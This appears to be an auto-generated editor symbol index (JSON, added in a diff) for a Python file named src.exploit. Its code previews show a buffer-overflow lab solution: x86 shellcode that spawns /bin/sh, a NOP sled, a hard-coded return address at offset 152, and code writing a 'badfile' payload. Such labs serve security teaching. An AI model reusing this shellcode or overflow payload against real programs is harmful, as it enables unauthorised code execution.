@@ -1,0 +1,65 @@
+[
+    {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "shellcode",
+        "kind": 5,
+        "importPath": "src.exploit",
+        "description": "src.exploit",
+        "peekOfCode": "shellcode = (\n    \"\\x31\\xc0\"  # xorl    %eax,%eax\n    \"\\x50\"  # pushl   %eax\n    \"\\x68\"\n    \"//sh\"  # pushl   $0x68732f2f\n    \"\\x68\"\n    \"/bin\"  # pushl   $0x6e69622f\n    \"\\x89\\xe3\"  # movl    %esp,%ebx\n    \"\\x50\"  # pushl   %eax\n    \"\\x53\"  # pushl   %ebx",
+        "detail": "src.exploit",
+        "documentation": {}
+    },
+    {
+        "label": "content",
+        "kind": 5,
+        "importPath": "src.exploit",
+        "description": "src.exploit",
+        "peekOfCode": "content = bytearray(0x90 for i in range(517))\n# Put the shellcode at the end\nstart = 517 - len(shellcode)\ncontent[start:] = shellcode\n##################################################################\nret = (\n    0xBFFFE9E8 + 369 - len(shellcode)\n)  # replace 0xAABBCCDD with the correct value (replaced)\noffset = 152  # replace 0 with the correct value\ncontent[offset : offset + 4] = (ret).to_bytes(4, byteorder=\"little\")",
+        "detail": "src.exploit",
+        "documentation": {}
+    },
+    {
+        "label": "start",
+        "kind": 5,
+        "importPath": "src.exploit",
+        "description": "src.exploit",
+        "peekOfCode": "start = 517 - len(shellcode)\ncontent[start:] = shellcode\n##################################################################\nret = (\n    0xBFFFE9E8 + 369 - len(shellcode)\n)  # replace 0xAABBCCDD with the correct value (replaced)\noffset = 152  # replace 0 with the correct value\ncontent[offset : offset + 4] = (ret).to_bytes(4, byteorder=\"little\")\n##################################################################\n# Write the content to a file",
+        "detail": "src.exploit",
+        "documentation": {}
+    },
+    {
+        "label": "content[start:]",
+        "kind": 5,
+        "importPath": "src.exploit",
+        "description": "src.exploit",
+        "peekOfCode": "content[start:] = shellcode\n##################################################################\nret = (\n    0xBFFFE9E8 + 369 - len(shellcode)\n)  # replace 0xAABBCCDD with the correct value (replaced)\noffset = 152  # replace 0 with the correct value\ncontent[offset : offset + 4] = (ret).to_bytes(4, byteorder=\"little\")\n##################################################################\n# Write the content to a file\nwith open(\"badfile\", \"wb\") as f:",
+        "detail": "src.exploit",
+        "documentation": {}
+    },
+    {
+        "label": "ret",
+        "kind": 5,
+        "importPath": "src.exploit",
+        "description": "src.exploit",
+        "peekOfCode": "ret = (\n    0xBFFFE9E8 + 369 - len(shellcode)\n)  # replace 0xAABBCCDD with the correct value (replaced)\noffset = 152  # replace 0 with the correct value\ncontent[offset : offset + 4] = (ret).to_bytes(4, byteorder=\"little\")\n##################################################################\n# Write the content to a file\nwith open(\"badfile\", \"wb\") as f:\n    f.write(content)",
+        "detail": "src.exploit",
+        "documentation": {}
+    },
+    {
+        "label": "offset",
+        "kind": 5,
+        "importPath": "src.exploit",
+        "description": "src.exploit",
+        "peekOfCode": "offset = 152  # replace 0 with the correct value\ncontent[offset : offset + 4] = (ret).to_bytes(4, byteorder=\"little\")\n##################################################################\n# Write the content to a file\nwith open(\"badfile\", \"wb\") as f:\n    f.write(content)",
+        "detail": "src.exploit",
+        "documentation": {}
+    }
+]
